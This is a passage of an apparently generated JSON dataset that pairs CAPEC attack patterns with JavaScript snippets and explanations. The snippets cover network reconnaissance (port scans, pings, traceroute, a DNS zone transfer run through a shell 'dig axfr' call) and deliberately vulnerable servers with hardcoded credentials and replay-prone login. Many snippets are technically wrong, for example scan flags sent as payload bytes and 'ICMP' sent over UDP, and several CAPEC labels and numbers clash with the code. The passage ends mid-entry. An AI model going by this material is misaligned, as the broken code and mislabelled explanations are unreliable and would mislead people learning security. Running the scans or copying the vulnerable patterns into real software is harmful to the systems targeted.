        "code_snippet": "const soapRequest = `\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>password</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>`;\n\nfetch('http://example.com/webservices', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'text/xml'\n  },\n  body: soapRequest\n})\n.then(response => response.text())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates a SOAP request to a web service. The SOAP request contains a login operation with hardcoded credentials. This example embodies the main idea of SOAP Manipulation by showing how an attacker could manipulate SOAP parameters to send malicious requests. The code does not ensure that the SOAP message is well-formed or that security properties are met (CWE-707). It also relies on client-side enforcement of security (CWE-602) and does not restrict XML external entity references (CWE-611). Additionally, it demonstrates the potential for authentication bypass by capture-replay (CWE-294) and the use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  const params = { username: 'admin', password: 'password' };\n  client.SomeService.SomeMethod(params, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});\n\n// Attacker intercepts and modifies the SOAP request\nconst tamperedParams = { username: 'admin', password: 'wrongpassword' };\nclient.SomeService.SomeMethod(tamperedParams, function(err, result) {\n  if (err) throw err;\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates a SOAP client making a request to a web service. The code first creates a SOAP client using a WSDL URL and then makes a request with specific parameters. The vulnerability is illustrated by an attacker intercepting and modifying the SOAP request parameters (e.g., changing the password). This represents the main idea of SOAP Parameter Tampering (CAPEC-279). The related CWEs provide context, such as the exposure of sensitive information in the WSDL file (CWE-651) and the potential for authentication bypass (CWE-294) if the service does not properly validate the modified parameters."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from([0x08, 0x00, 0x4d, 0x3b, 0x00, 0x01, 0x00, 0x01]); // ICMP Echo Request\nconst targetHost = '192.168.1.1';\nconst targetPort = 7; // Echo Protocol\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n  } else {\n    console.log('Ping message sent');\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}: ${msg.toString('hex')}`);\n});",
        "description": "This JavaScript code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target host using the UDP protocol. The code creates a UDP socket, constructs an ICMP Echo Request message, and sends it to the target host. If the target host is responsive and not protected by a firewall or ACL, it will reply with an ICMP Echo Reply. The code listens for the response and logs it. This snippet embodies the main idea of the CAPEC by showing how an adversary can determine if a target system is responsive. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200), improper protection of outbound messages (CWE-1320), and cleartext transmission (CWE-319), which can be exploited during such an exchange."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPorts = [22, 80, 443, 8080];\n\nfunction synScan(host, ports) {\n  ports.forEach(port => {\n    const socket = new net.Socket();\n    socket.setTimeout(1000);\n    socket.on('connect', () => {\n      console.log(`Port ${port} is open on ${host}`);\n      socket.destroy();\n    });\n    socket.on('timeout', () => {\n      console.log(`Port ${port} is filtered or closed on ${host}`);\n      socket.destroy();\n    });\n    socket.on('error', (err) => {\n      console.log(`Port ${port} is closed on ${host}`);\n    });\n    socket.connect(port, host);\n  });\n}\n\nsynScan(targetHost, targetPorts);",
        "description": "This JavaScript code snippet performs a basic TCP SYN scan on a target host to determine the status of specified ports. The `net` module is used to create a socket connection to each port. If the connection is successful, the port is considered open. If the connection times out or an error occurs, the port is considered closed or filtered. This code embodies the main idea of the CAPEC by demonstrating how an adversary might use a SYN scan to gather information about open ports on a target system. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), the risk of multiple binds to the same port (CWE-605), and the excessive attack surface (CWE-1125) that can be exploited by such scans."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      const hash = crypto.createHash('sha256').update(password).digest('hex');\n      // Vulnerable: Authentication bypass by replay attack\n      if (username === 'admin' && hash === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1e6d7e9e5b9e9e') {\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end('Authenticated');\n      } else {\n        res.writeHead(401, { 'Content-Type': 'text/plain' });\n        res.end('Unauthorized');\n      }\n    });\n  } else {\n    res.writeHead(405, { 'Content-Type': 'text/plain' });\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for POST requests containing a username and password. The password is hashed using SHA-256 and compared to a hardcoded hash value. If the username is 'admin' and the hashed password matches the hardcoded hash, the user is authenticated. This code is vulnerable to a replay attack (CWE-294) because it does not use any mechanism to prevent the reuse of captured authentication data. An attacker could capture the network traffic and replay the same request to gain unauthorized access. Additionally, the code does not handle state synchronization errors (CWE-373) or check for the existence of the required API functions (CWE-589), which could lead to further vulnerabilities."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to simulate non-transparent sharing of resources\napp.use((req, res, next) => {\n  // Simulate a shared cache that can be exploited\n  global.sharedCache = global.sharedCache || {};\n  const user = req.query.user;\n  if (user) {\n    global.sharedCache[user] = global.sharedCache[user] || [];\n    global.sharedCache[user].push(req.url);\n  }\n  next();\n});\n\n// Route that simulates access to protected and unprotected resources\napp.get('/resource', (req, res) => {\n  const address = req.query.address;\n  if (address >= 1000 && address <= 2000) {\n    res.send('Access to protected resource');\n  } else if (address >= 2001 && address <= 3000) {\n    res.send('Access to unprotected resource');\n  } else if (address >= 1500 && address <= 2500) {\n    res.send('Access to overlapping region');\n  } else {\n    res.send('Invalid address');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a web server that demonstrates vulnerabilities related to the deprecated CAPEC pattern 'Infrastructure-based footprinting' and its associated CWEs. The middleware simulates non-transparent sharing of resources by using a global shared cache, which can be exploited by attackers to infer information about other users' requests (CWE-1303). The '/resource' route simulates access to protected and unprotected memory regions, with an overlapping region that allows bypassing access control (CWE-1316). This code highlights how improper management of shared resources and overlapping address spaces can lead to security vulnerabilities."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction enumerateMXRecords(domain) {\n  dns.resolveMx(domain, (err, addresses) => {\n    if (err) {\n      console.error('Error resolving MX records:', err);\n      return;\n    }\n    addresses.forEach(record => {\n      console.log(`MX Record: ${record.exchange} with priority ${record.priority}`);\n      dns.reverse(record.exchange, (err, hostnames) => {\n        if (err) {\n          console.error('Error performing reverse DNS lookup:', err);\n          return;\n        }\n        console.log(`Reverse DNS for ${record.exchange}: ${hostnames}`);\n      });\n    });\n  });\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using Node.js's 'dns' module. The function 'enumerateMXRecords' takes a domain name as input and performs a DNS query to retrieve the MX records. For each MX record, it logs the mail server's exchange and priority. Additionally, it performs a reverse DNS lookup on each mail server to obtain the associated hostnames. This process can reveal sensitive information about the network's mail servers and potentially expose internal IP addresses or firewall details, aligning with CAPEC-Enumerate Mail Exchange (MX) Records. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200), relying on reverse DNS resolution (CWE-350), and possibly omitting security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performZoneTransfer(domain) {\n  dns.resolveNs(domain, (err, nameservers) => {\n    if (err) throw err;\n    nameservers.forEach(ns => {\n      const dig = require('child_process').exec;\n      dig(`dig axfr ${domain} @${ns}`, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`Error: ${stderr}`);\n          return;\n        }\n        console.log(`Zone Transfer Data from ${ns}:\n${stdout}`);\n      });\n    });\n  });\n}\n\nperformZoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS Zone Transfer attack. It uses the 'dns' module to resolve the nameservers for a given domain and then attempts to perform a zone transfer using the 'dig' command. The 'dig axfr' command is executed for each nameserver, and if the zone transfer is allowed, it prints the zone data, which may include sensitive information about the network topology. This code embodies the main idea of CAPEC-137 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details. It also touches on CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by showing how DNS information can be misused."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n\nipRange.forEach(ip => {\n  const client = new net.Socket();\n  client.setTimeout(1000);\n  client.connect(80, ip, () => {\n    console.log(`Host ${ip} is alive`);\n    client.destroy();\n  });\n\n  client.on('error', () => {\n    console.log(`Host ${ip} is not responding`);\n  });\n\n  client.on('timeout', () => {\n    console.log(`Host ${ip} timed out`);\n    client.destroy();\n  });\n\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) {\n      console.log(`Reverse DNS lookup failed for ${ip}`);\n    } else {\n      console.log(`Reverse DNS lookup for ${ip}: ${hostnames}`);\n    }\n  });\n});",
        "description": "This JavaScript code snippet performs a basic host discovery by attempting to connect to a range of IP addresses on port 80. If a connection is successful, it logs that the host is alive. It also performs a reverse DNS lookup for each IP address to obtain the hostname. The code demonstrates the concept of host discovery (CAPEC-309) and highlights potential vulnerabilities such as reliance on reverse DNS resolution (CWE-350) and exposure of sensitive information (CWE-200). The use of cleartext transmission (CWE-319) is implied as the connection is made over an unencrypted channel (port 80)."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "const net = require('net');\n\nfunction traceroute(target) {\n  let ttl = 1;\n  const maxHops = 30;\n\n  function sendPacket() {\n    const socket = new net.Socket();\n    socket.setTimeout(5000);\n    socket.on('error', () => {});\n    socket.on('timeout', () => {});\n    socket.connect({ host: target, port: 80, localAddress: '0.0.0.0', localPort: 0, family: 4, hints: 0, lookup: undefined }, () => {\n      socket.setTTL(ttl);\n      socket.write('GET / HTTP/1.1\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n    });\n    socket.on('data', (data) => {\n      console.log(`Hop ${ttl}: ${socket.remoteAddress}`);\n      socket.destroy();\n      if (ttl < maxHops) {\n        ttl++;\n        sendPacket();\n      }\n    });\n  }\n\n  sendPacket();\n}\n\ntraceroute('example.com');",
        "description": "This JavaScript code snippet demonstrates a basic implementation of a traceroute utility using TCP packets. The function `traceroute` sends packets to a target server, incrementing the Time-to-Live (TTL) field with each hop. When the TTL expires, an ICMP diagnostic message is generated, revealing the IP address of the hop where the packet expired. This process continues until the maximum number of hops is reached or the target is reached. The code embodies the main idea of CAPEC-292 (Traceroute Route Enumeration) by mapping out the route data flows through the network. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) are demonstrated by the potential exposure of network topology information. CWE-319 (Cleartext Transmission of Sensitive Information) is represented by the unencrypted HTTP request. CWE-941 (Incorrectly Specified Destination in a Communication Channel) is shown by the potential for misdirected packets if the target is incorrectly specified."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst ICMP_TYPE_ADDRESS_MASK_REQUEST = 17;\nconst ICMP_CODE = 0;\nconst ICMP_CHECKSUM = 0;\nconst ICMP_IDENTIFIER = 0;\nconst ICMP_SEQUENCE_NUMBER = 0;\n\nconst buffer = Buffer.alloc(8);\nbuffer.writeUInt8(ICMP_TYPE_ADDRESS_MASK_REQUEST, 0);\nbuffer.writeUInt8(ICMP_CODE, 1);\nbuffer.writeUInt16BE(ICMP_CHECKSUM, 2);\nbuffer.writeUInt16BE(ICMP_IDENTIFIER, 4);\nbuffer.writeUInt16BE(ICMP_SEQUENCE_NUMBER, 6);\n\nclient.send(buffer, 0, buffer.length, 7, '192.168.1.1', (err) => {\n  if (err) {\n    console.error('Error sending ICMP Address Mask Request:', err);\n  } else {\n    console.log('ICMP Address Mask Request sent');\n  }\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates how to send an ICMP Address Mask Request (Type 17) to a target IP address (192.168.1.1) using the 'dgram' module for UDP communication. The code constructs an ICMP packet with the necessary fields and sends it to the target. This action can expose sensitive network configuration information, such as subnet masks and default gateways, which can be exploited for further attacks. The code embodies the main idea of CAPEC-ICMP Address Mask Request and highlights related weaknesses such as exposure of sensitive information (CWE-200), reliance on IP address for authentication (CWE-291), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'GET' && req.url.includes('/timestamp')) {\n    const timestamp = new Date().toISOString();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Timestamp: ${timestamp}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for GET requests at the '/timestamp' endpoint and responds with the current timestamp in ISO format. This demonstrates the 'Timestamp Request' attack pattern (CAPEC) by exposing the server's current time. An attacker could use this information to exploit time-based security mechanisms. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses GET requests with potentially sensitive data (CWE-598), and could be used to observe timing discrepancies (CWE-208) or create covert timing channels (CWE-385)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ICMP_INFO_REQUEST') {\n    const response = Buffer.from('Sensitive Information: IP Configuration');\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(41234, () => {\n  console.log('Server listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming messages. When it receives a message with the content 'ICMP_INFO_REQUEST', it responds with a message containing sensitive information ('Sensitive Information: IP Configuration'). This demonstrates the vulnerability described in the CAPEC by showing how an adversary could send an ICMP Information Request to obtain sensitive information. The code also embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive data in cleartext without proper authorization checks."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendTcpAckPing(host, port) {\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag set\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes(Buffer.from([0x14]))) { // RST flag set\n      console.log('Host is alive');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n    client.destroy();\n  });\n}\n\nsendTcpAckPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP ACK Ping to determine if a remote host is alive. The `sendTcpAckPing` function creates a TCP socket connection to the specified host and port. It sends a TCP segment with the ACK flag set. If the host is alive, it will respond with a RST packet, which the client detects and logs 'Host is alive'. This code embodies the CAPEC concept of using TCP ACK Ping to check if a host is alive. Additionally, it touches on CWE-319 by potentially exposing sensitive information in cleartext, and CWE-200 by revealing the host's status to an unauthorized actor."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetHost = '192.168.1.1';\nconst targetPort = 65535;\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending UDP packet:', err);\n  } else {\n    console.log('UDP packet sent to ' + targetHost + ':' + targetPort);\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP datagram to a high port (65535) on a target host (192.168.1.1). The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. This embodies the main idea of the CAPEC 'UDP Ping'. The code also listens for any incoming messages, which could expose sensitive information (CWE-200) if the target responds. The use of a high port number and the potential for incorrect destination specification (CWE-941) are also demonstrated. Additionally, the code does not encrypt the message (CWE-319), and improper handling of error messages (CWE-1320) is shown by simply logging errors to the console."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nfunction tcpSynPing(target, port) {\n  const client = new net.Socket();\n  client.setTimeout(5000);\n\n  client.connect(port, target, () => {\n    console.log('TCP SYN packet sent');\n  });\n\n  client.on('data', (data) => {\n    console.log('Received response:', data.toString());\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.log('Error:', err.message);\n    client.destroy();\n  });\n\n  client.on('timeout', () => {\n    console.log('No response, target might be down or port is closed');\n    client.destroy();\n  });\n}\n\ntcpSynPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that attempts to connect to a specified target and port, simulating a TCP SYN ping. The client sends a TCP SYN packet and waits for a response. If a response is received, it logs the response data, indicating that the target is alive. If an error occurs or the connection times out, it logs an appropriate message. This code embodies the main idea of the CAPEC by using TCP SYN packets for host discovery. The related CWEs are represented by the potential exposure of sensitive information (CWE-200) through the response data, and the possibility of multiple binds to the same port (CWE-605) if the port is already in use. Additionally, the code does not ensure message integrity (CWE-924) and transmits data in cleartext (CWE-319), which could be sniffed by unauthorized actors."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\n\nconst sensitiveData = 'Sensitive Information';\nconst port = 8080;\n\nconst server = net.createServer((socket) => {\n  socket.write(sensitiveData); // CWE-319: Cleartext Transmission of Sensitive Information\n  socket.end();\n});\n\nserver.listen(port, () => {\n  console.log(`Server listening on port ${port}`);\n});\n\n// CWE-605: Multiple Binds to the Same Port\nconst anotherServer = net.createServer((socket) => {\n  socket.write('Another service on the same port');\n  socket.end();\n});\n\nanotherServer.listen(port, () => {\n  console.log(`Another server also listening on port ${port}`);\n});",
        "description": "This JavaScript code snippet creates two TCP servers that both attempt to bind to the same port (8080). The first server transmits sensitive information in cleartext, which can be intercepted by unauthorized actors (CWE-319). The second server also binds to the same port, which can lead to service hijacking or spoofing (CWE-605). This setup demonstrates the vulnerability of port scanning, where an adversary can detect open ports and potentially exploit the services running on them."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to ' + targetIP + ':' + targetPort);\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.log('Port ' + targetPort + ' is closed or unreachable.');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connect scan to check if a specific port on a target IP address is open. The code attempts to establish a TCP connection to the target IP and port. If the connection is successful, it logs a message indicating the port is open and then closes the connection. If an error occurs (e.g., the port is closed or unreachable), it logs a message indicating the port is closed. This embodies the main idea of the CAPEC 'TCP Connect Scan' by using a full TCP connection attempt to determine the status of a port. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target system logs connection attempts, and it relies on the IP address for the connection (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpFinScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const finPacket = Buffer.from([0x01]); // Simplified FIN packet\n    client.write(finPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpFinScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified TCP FIN scan to determine if a port is closed on a target machine. The `tcpFinScan` function connects to a specified target and port, sends a simplified FIN packet, and listens for a response. If a 'RST' (Reset) packet is received, it indicates that the port is closed. Otherwise, the port is considered open. This scan leverages the behavior described in RFC 793, where out-of-state FIN packets to closed ports result in RST responses. The code also includes basic error handling. This example embodies the CAPEC concept of using TCP FIN scans to detect closed ports and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing port states to unauthorized actors."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nfunction sendXmasScan(targetIP, targetPort) {\n  const client = new net.Socket();\n  const xmasPacket = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]); // All flags set\n\n  client.connect(targetPort, targetIP, () => {\n    client.write(xmasPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${targetPort} is closed.`);\n    } else {\n      console.log(`Port ${targetPort} is open or filtered.`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\nsendXmasScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Xmas scan, which is used to determine if ports on a target machine are closed. The code uses the 'net' module to create a TCP socket and sends a packet with all possible flags set (Xmas packet) to the target IP and port. If a 'RST' (reset) packet is received in response, it indicates that the port is closed. Otherwise, the port is considered open or filtered. This scan technique leverages the behavior described in RFC 793, where out-of-state flags sent to closed ports should elicit a RST response. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(target, port) {\n  const client = new net.Socket();\n\n  client.connect(port, target, () => {\n    const nullPacket = Buffer.alloc(0); // Create an empty buffer to simulate a TCP NULL packet\n    client.write(nullPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpNullScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan, which is used to determine if a port is closed on a target machine. The code uses the 'net' module to create a TCP connection to the specified target and port. It then sends an empty buffer to simulate a TCP NULL packet. If the target port is closed, the server will respond with a RST packet, which is detected in the 'data' event handler. The code also includes basic error handling to manage connection errors. This snippet embodies the main idea of CAPEC-303 (TCP Null Scan) and highlights potential weaknesses such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-476 (NULL Pointer Dereference) by demonstrating how an attacker can gather information about closed ports using illegal TCP packets."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpAckScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n    client.destroy();\n  });\n}\n\ntcpAckScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP ACK scan using Node.js. The function `tcpAckScan` connects to a specified target and port, then sends an ACK packet to gather information about the firewall or ACL configuration. The response is logged to the console. This scan can help identify how a firewall handles ACK packets, which can be combined with SYN scans for a more comprehensive understanding of firewall rules. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319) by logging responses and not securing the communication channel."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowScan(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    client.write('GET / HTTP/1.1\\r\\nHost: ' + targetIP + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const windowSize = data.readUInt16BE(14); // Extract TCP Window Size from the TCP header\n    console.log(`Window Size: ${windowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpWindowScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP Window Scan using Node.js. The function `tcpWindowScan` connects to a specified target IP and port, sends a simple HTTP GET request, and then reads the TCP Window Size from the response. The window size is extracted from the TCP header and logged to the console. This scan can help infer the status of the port and potentially the operating system type based on the window size value. The code embodies the CAPEC concept by performing a TCP Window Scan and relates to the CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and transmitting data in cleartext (CWE-319)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "const net = require('net');\nconst rpcPort = 111; // Common RPC port\n\nconst client = new net.Socket();\nclient.connect(rpcPort, 'target-host', () => {\n  console.log('Connected to RPC service');\n  client.write('RPC request data'); // CWE-200: Potential exposure of sensitive information\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-294: Replay the captured data\n  client.write(data);\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a common RPC port (111) on a target host. The client sends an initial RPC request and logs any received data. The received data is then replayed back to the server, potentially exploiting a capture-replay vulnerability (CWE-294). The code also highlights the risk of exposing sensitive information (CWE-200) during the communication. This snippet embodies the main idea of a TCP RPC scan, where an adversary scans for and interacts with RPC services on a Unix/Linux host."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nconst message = Buffer.from('Hello, UDP!');\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}:${rinfo.port} - ${msg}`);\n  client.close();\n});\n\nclient.on('error', (err) => {\n  console.error(`Client error:\n${err.stack}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a basic UDP scan using Node.js. The code creates a UDP client that sends a datagram to a specified target host and port. If the port is open, the application-specific response might be received, but typically, no response is expected for open ports. The code listens for any incoming messages, which could indicate the port status. This embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the UDP port status on a target system. The code also touches on related CWEs: it could expose sensitive information (CWE-200) if responses are not properly handled, and it lacks integrity checks (CWE-353) for the transmitted data."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/network-info') {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    const networkInterfaces = os.networkInterfaces();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(networkInterfaces));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. When a request is made to the '/network-info' endpoint, the server responds with detailed network interface information of the host machine. This demonstrates the CAPEC concept of 'Network Topology Mapping' by exposing sensitive network information. The code also embodies CWE-200 by exposing sensitive information to unauthorized actors, as there is no access control mechanism in place. This can be exploited by adversaries to perform network reconnaissance and map the network topology."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
